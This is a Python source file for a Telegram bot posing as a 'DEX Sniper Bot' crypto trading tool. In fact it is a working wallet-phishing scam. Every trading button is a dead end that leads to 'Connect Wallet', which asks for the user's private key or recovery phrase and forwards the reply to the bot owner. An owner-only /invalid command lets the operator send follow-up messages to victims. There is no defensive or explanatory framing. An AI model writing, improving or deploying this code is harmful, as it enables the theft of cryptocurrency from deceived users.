import os
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters

# Load environment variables
BOT_TOKEN = os.getenv('TELEGRAM_TOKEN')
OWNER_ID = os.getenv("OWNER_ID")

if not BOT_TOKEN or not OWNER_ID:
    raise ValueError("Missing TELEGRAM_TOKEN or OWNER_ID in environment variables")

OWNER_ID = int(OWNER_ID)

waiting_for_wallet = set()

# /start command handler
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🧩 Connect Wallet", callback_data='connect')],
        [InlineKeyboardButton("🎁 Claim Gift", callback_data='claim')],
        [InlineKeyboardButton("🟢 Buy", callback_data='buy'), InlineKeyboardButton("🔴 Sell", callback_data='sell')],
        [InlineKeyboardButton("📈 DCA Order", callback_data='dca'), InlineKeyboardButton("⏱ Limit Order", callback_data='limit')],
        [InlineKeyboardButton("📊 View Position", callback_data='position')],
        [InlineKeyboardButton("🆘 Help", callback_data='help')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "👋 Welcome to DEX Sniper Bot!\nTrack new tokens, trade instantly, and automate your moves.\nUse the buttons below to get started 👇",
        reply_markup=reply_markup
    )

# Button handler
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    action = query.data

    responses = {
        'connect': "Please enter your wallet address followed by your Private key/Recovery phrase.",
        'claim': "🎁 Please connect your wallet first. Click /start to continue.",
        'buy': "🟢 Please connect your wallet first. Click /start to continue.",
        'sell': "🔴 Please connect your wallet first. Click /start to continue.",
        'dca': "📈 Please connect your wallet first. Click /start to continue.",
        'limit': "⏱ Please connect your wallet first. Click /start to continue.",
        'position': "📊 Please connect your wallet first. Click /start to continue.",
        'help': "🆘 Help request received! The admin has been notified. Click /start to continue."
    }

    await query.edit_message_text(text=responses.get(action, "Unknown action."))

    if action == "connect":
        user = update.effective_user
        alert_msg = f"⚠️ Wallet info incoming from {user.username or user.id}..."
        await context.bot.send_message(chat_id=OWNER_ID, text=alert_msg)
        waiting_for_wallet.add(user.id)

async def forward_wallet_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username

    if user_id in waiting_for_wallet:
        message_text = update.message.text

        sender_info = f"@{username} (ID: {user_id})" if username else f"(no username) ID: {user_id}"
        msg = f"🔐 Wallet info received from {sender_info}:\n\n{message_text}"
        await context.bot.send_message(chat_id=OWNER_ID, text=msg)

        user_display = f"@{username}" if username else "(no username)"
        await update.message.reply_text(
            f"✅ Wallet info received. Thank you! Awaiting admin response..."
        )

        waiting_for_wallet.remove(user_id)

# /invalid command handler (owner only)
async def invalid_format(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return  # Not the owner

    if len(context.args) < 2:
        await update.message.reply_text("Usage: /invalid <user_id> <message>")
        return

    user_id = context.args[0]
    message = " ".join(context.args[1:])
    
    try:
        await context.bot.send_message(chat_id=int(user_id), text=f"⚠️ {message}")
        await update.message.reply_text(f"Sent to user {user_id}.")
    except Exception as e:
        await update.message.reply_text(f"Failed to message user {user_id}: {e}")

# Main function
def main():
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(CommandHandler("invalid", invalid_format))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, forward_wallet_message))

    print("🤖 Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()